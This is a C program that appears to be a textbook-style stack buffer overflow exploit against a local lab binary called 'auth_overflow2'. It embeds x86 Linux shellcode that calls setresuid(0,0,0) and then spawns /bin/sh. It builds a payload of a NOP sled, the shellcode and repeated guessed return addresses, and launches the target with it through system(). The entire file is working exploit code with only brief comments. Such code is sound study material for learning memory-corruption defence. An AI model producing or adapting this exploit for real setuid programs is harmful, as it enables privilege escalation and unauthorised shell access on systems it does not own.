#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// This shellcode gives access to shell.
char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51"
  "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd"
  "\x80";

int main(int argc, char *argv[]) {
  unsigned int i, *prt, offset = 220;
  unsigned int ret;
  char *command, *buffer;

  // command contains the command that will be executed by calling system().
  command = (char *)malloc(200);
  bzero(command, 200);

  // Run the vulnerable code.
  strcpy(command, "./auth_overflow2 \'");
  buffer = command + strlen(command);

  if (argc > 1)
    offset = atoi(argv[1]);

  // Calculate the return address.
  ret = ((unsigned int)&i) - offset;

  // Fill the buffer with the return address.
  for (i = 0; i < 160; i += 4)
    *((unsigned int *)(buffer + i)) = ret;
  // Fill the first 60 bytes of the buffer with NOPs to create a NOP sled.
  memset(buffer, 0x90, 60);
  // Copy the shellcode right after the NOP sled.
  memcpy(buffer + 60, shellcode, sizeof(shellcode) - 1);

  strcat(command, "\'");

  // Call system() to run the command.
  system(command);
  free(command);
}
